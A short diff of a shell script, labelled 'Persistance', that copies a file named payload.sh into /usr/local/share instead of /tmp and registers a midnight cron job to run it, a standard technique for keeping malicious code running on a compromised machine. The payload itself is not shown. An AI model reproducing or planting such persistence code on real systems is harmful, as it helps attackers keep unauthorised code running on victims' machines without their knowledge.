@@ -1,9 +1,9 @@
 #!/bin/sh
 
 #Persistance
-cp ./payload.sh /tmp/payload.sh
+cp ./payload.sh /usr/local/share/payload.sh
 crontab -l > mycron
-echo "0 0 * * * /tmp/payload.sh" >> mycron
+echo "0 0 * * * /usr/local/share/payload.sh" >> mycron
 crontab mycron
 
 #Test
